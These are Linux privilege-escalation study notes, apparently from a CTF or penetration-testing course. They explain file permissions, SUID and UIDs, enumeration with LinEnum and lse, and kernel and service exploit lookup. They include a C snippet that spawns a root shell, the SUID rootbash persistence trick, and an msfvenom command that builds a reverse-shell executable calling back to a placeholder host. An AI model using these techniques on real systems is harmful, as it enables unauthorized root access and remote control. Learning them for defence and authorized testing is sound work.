#### 2. Privilege Escalation in Linux 

- All Privilege escalations are effectively examples of control violations.
- Access control and user permissions are intrinsically linked.
- When focusing on privilege escalation in Linux, understanding how Linux handles permissions is very important

#### 3. Understanding Permisssions in Linux
**Users**
- User accounts are configured in the `/etc/passwd` file.
- User password hashes are stored in the `/etc/shadow` file.
- Users are identified by an integer user ID (`UID`).
- The `“root”` user account is a special type of account in Linux.
    It has an UID of 0, and the system grants this user access to
    every file.

##### 3.1 Groups  
- Groups are configured in the  `/etc/group` file.
- Users have a primary group, and can have multiple secondary(or supplementary) groups.
- By default, a user's primary group has the ssame name as their user account

##### 3.2 Files & Directories
- All files & directories have a single owner and a group.
- Permissions are defined in terms of read, write, and execute operations.
- There are three sets of permissions, one for the owner, one for the group and one for all 'other' users(can also be referred to as 'world')
- Only the owner can change the permissions.

##### 3.3 File Permissions
- Read - When set, the file contents can be read/
- Write - when set, the file contents can be modified.
- Execute- when set, the file can be executed(i.e. run as some kind of process).

##### 3.4 Directory Permissions
Directory permissions are slightly more complicated:
- Execute - when set, the directory can be entered. Without this permission, neither the read nor write permissions will work.
- Read - when set, the directory contents can be listed.
- Write - when set, files and subdirectories can be created in the directory.


##### 3.5 Special Permissions

**setuid(SUID) bit**
- when set, files will get executed with the previliges of the owner.

**setgid(SGID) bit**
- when set on a file, the file will get executed with the privileges of the file group.
- when set on a directory, files created within that directory will inherit the group of the directory itself.


##### 3.5 Viewing Permissions:
- the `ls` command can be used to view permissions:  
```bash
└─$ ls -l
total 136648
-rw-r--r-- 1 kali kali       243 Apr  8 17:24 passwords.txt
-rw-r--r-- 1 kali kali 139921507 Apr  5 08:19 rockyou.txt
```
- The first 10 characters indicate the permissions set on the file or directory.
- The first character simply indicates the type( e.g. '`-`' for file, `d` for directory).
- The remaining 9 charcters represent the 3 sets of permissions(owner, group, others).
- Each set contains 3 characters, indicating the read (`r`), write (`w`), and execute (`x`) permissions.
- __SUID/SGID__ permissions are represented by an `s` in the execute position. 


##### 3.6 Real, Effective, & Saved UID/GID

- The users are identified by a user ID.
- In fact, each user has 3 user IDs in Linux (real, effective, and saved).
- A user's ral ID is who they actually are(the ID defined in `/etc/passwd`). Ironically, the real ID is actually used less often to check a user's identity.
- A user's effective ID is normally equal to their real ID, however when executing a process as another user, the effective ID is set to that user's real ID.
- The effective ID is used in most access control decissions to verify a user, and commands such as `whoami` use the effective ID.
- Finally, the saved ID is used to ensure that SUID processes can temporarily switch a user's effective ID back to their real ID and back again without losing track of the original effective ID.
- Print real and effective user / group IDs:
    - Example: 1
    ```bash
       $ id
        uid=1000(user) gid=1000(user) euid=0(root) egid=0(root)
        groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev
        ),1000(user)
    ```
     - Example: 2
     ```bash
     $ id
     uid=1000(kali) gid=1000(kali) groups=1000(kali),24(cdrom),
     25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),
     109(netdev),119(bluetooth),133(scanner),141(kaboxer)
    ```
- Print real. effective, saved, and file system user/ group IDs of the current process (i.e. our shell):

    ```bash
    └─$ cat /proc/$$/status | grep "[UG]id"
    Uid:    1000    1000    1000    1000
    Gid:    1000    1000    1000    1000
    ```



#### 4. Spawning Root Shells  

- The ultimate goal is to spawn a root shell.
- While the end result is same (executing `/bin/sh` or `/bin/bash`), there are multiple ways of achieveing this execution.
- One of the best ways to spawn a root shell is to create a copy of the `/bin/bash` executable file (rename it as *rootbash*), make sure it is owned by the root user, and has the SUID bit set.
- A root shell can be spawned by simply executing the rootbash file with the `-p` command line option.
- The benefit of this method is its is persistent(once exploited, *rootbash* can be used multiple times).

##### 4.1 Custom Executable

-There may be instances where some root process executes another process which you can control. In these cases, the following C code, once compiled, will spawn a Bash shell running as root:  
```c
int main() {
    setuid(0);
    system("/bin/bash -p");
}
```
compile using:
```bash
$ gcc -o <name> <filename.c>
```  


##### 4.2 msfvenom

- ALternatively, if a reverse shell  is preferred, `msfvenom` can be used to generate an executable (`.elf`) file:

```bash
$ msfvenom -p linux/x86/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell.elf
```
- This reverse shell can be caught using `netcat` or Metasploit's own 'multi/handler'.


#### 5 Privelege Escalation Tools

**Why use tools..?**  
- Tools allow us to automate the reconnaissance that can identify potential privilege escalation
- We use `Linux Smart Enumeration` and `LinEnum`


##### 5.1 Linux Smart Enumeration
General usage:
```bash
$ ./lse.sh
```
```bash
$ ./lse.sh -l 2 -i 
```
`-i` to skip password for current user  


##### 5.2 LinEnum

General usage:
version 0.982
Example: 
```bash 
./LinEnum.sh -s -k keyword -r report -e /tmp/ -t
```
OPTIONS:

- -k Enter keyword
- -e Enter export location
- -t Include thorough (lengthy) tests
- -s Supply current user password to check sudo perms (INSECURE)
- -r Enter report name
- -h Displays this help text

Running with no options = limited scans/no output file

- -e Requires the user enters an output location i.e. /tmp/export. If this location does not exist, it will be created.
- -r Requires the user to enter a report name. The report (.txt file) will be saved to the current working directory.
- -t Performs thorough (slow) tests. Without this switch default 'quick' scans are performed.
- -s Use the current user with supplied password to check for sudo permissions - note this is insecure and only really for CTF use!
- -k An optional switch for which the user can search for a single keyword within many files (documented below).



**High-level summary of the checks/tasks performed by LinEnum:**

- Kernel and distribution release details
- System Information:
    - Hostname
    - Networking details:
    - Current IP
    - Default route details
    - DNS server information
- User Information:
    - Current user details
    - Last logged on users
    -Shows users logged onto the host
    - List all users including uid/gid information
    - List root accounts
    - Extracts password policies and hash storage method information
    - Checks umask value
    - Checks if password hashes are stored in /etc/passwd
    - Extract full details for ‘default’ uid’s such as 0, 1000, 1001 etc
    - Attempt to read restricted files i.e. /etc/shadow
    - List current users history files (i.e .bash_history, .nano_history etc.)
    - Basic SSH checks
- Privileged access:
    - Which users have recently used sudo
    - Determine if /etc/sudoers is accessible
    - Determine if the current user has Sudo access without a password
    - Are known ‘good’ breakout binaries available via Sudo (i.e. nmap, vim etc.)
    - Is root’s home directory accessible
    - List permissions for /home/
- Environmental:
    - Display current $PATH
    - Displays env information
- Jobs/Tasks:
    - List all cron jobs
    - Locate all world-writable cron jobs
    - Locate cron jobs owned by other users of the system
    - List the active and inactive systemd timers
- Services:
    - List network connections (TCP & UDP)
    - List running processes
    - Lookup and list process binaries and associated permissions
    - List inetd.conf/xined.conf contents and associated binary file permissions
    - List init.d binary permissions
- Version Information (of the following):
    - Sudo
    - MYSQL
    - Postgres
    - Apache
        - Checks user config
        - Shows enabled modules
        - Checks for htpasswd files
        - View www directories
- Default/Weak Credentials:
    - Checks for default/weak Postgres accounts
    - Checks for default/weak MYSQL accounts
- Searches:
    - Locate all SUID/GUID files
    - Locate all world-writable SUID/GUID files
    - Locate all SUID/GUID files owned by root
    - Locate ‘interesting’ SUID/GUID files (i.e. nmap, vim etc)
    - Locate files with POSIX capabilities
    - List all world-writable files
    - Find/list all accessible *.plan files and display contents
    - Find/list all accessible *.rhosts files and display contents
    - Show NFS server details
    - Locate *.conf and *.log files containing keyword supplied at script runtime
    - List all *.conf files located in /etc
    - .bak file search
    - Locate mail
- Platform/software specific tests:
    - Checks to determine if we're in a Docker container
    - Checks to see if the host has Docker installed
    - Checks to determine if we're in an LXC container



#### 6. Kernel Exploits

- Kernals are the core of any operating system
- Think of it as a layer between application software and the actual computer hardware.
- The kernel has complete control over the operating system. Exploiting a kernerl vulnerability can result in execution as the root user.


##### 6.1 Finding Kernal Exploits

- Finding and using kernerl exploits is usually a simple process:

    1. Enumerate kernel version (`uname -a`).
    2. Find matching exploits (Google, ExploitDb, GitHub).
    3. Compile and run.

> As Kernel exploits can often be unstable and may be one-shot or cuase a system crash. use it as a last resort for exploiting.

```bash
user@debian:/$ uname -a
Linux debian 2.6.32-5-amd64 # SMP Tue May 13 16:34:35 UTC 2014 x86_64 GNU/Linux
```

  <br> 

 #### 7 Service Exploits

 - Services are simply programs that run in the background, accepting input or performing regular tasks.
 - If vulnerable services are running as root, exploiting them can lead to command execution as root.
 - Service exploits can be found using Searchsploit, Google, Github just like kernel exploits.


 ##### 7.1 Services Running as Root

 - The following command will show all processes that are running as root:
    ```bash
    $ ps aux | grep "^root"
    ```





##### 7.2 Enumerating Program versions

- Running the program with the `--version` or `-v` command line options often shows the version number:
  ```bash
    $ <program> --version
    $ <program> -v
  ```

- On Debian-like distributions, dpkg can show installed programs and their version:
    ```bash
     $ dpkg -l | grep <program>
    ```
- On systems that use rpm, the following achieves the same:

    ```bash
    $ rpm -qa | grep <program>
    ```


- After running:

    ```bash
    $ ./lse.sh -l 1 -i
    ```
    Found:

    ```bash
    [!] sof010 Can we connect to MySQL as root without password?............... yes!
    ```

    Found: 
    ```bash
    user@debian:~/tools/privesc-scripts$ ps aux | grep "root"
    firefart  1853  0.0  4.7 163616 24172 ?        Sl   Apr10   0:06 /usr/sbin/mysqld --basedir=/usr --datadir=/var/lib/mysql --user=root --pid-file=/var/run/mysqld/mysqld.pid --socket=/var/run/mysqld/mysqld.sock --port=3306
    user     27748  0.0  0.1   7592   864 pts/3    S+   00:16   0:00 grep root

    ```
    > `firefart` is root now

    ```bash
    user@debian:~$ mysqld --version
    mysqld  Ver 5.1.73-1+deb6u1 for debian-linux-gnu on x86_64 ((Debian))
    ```

<br></br><br></br><br></br><br></br><br></br><br></br>


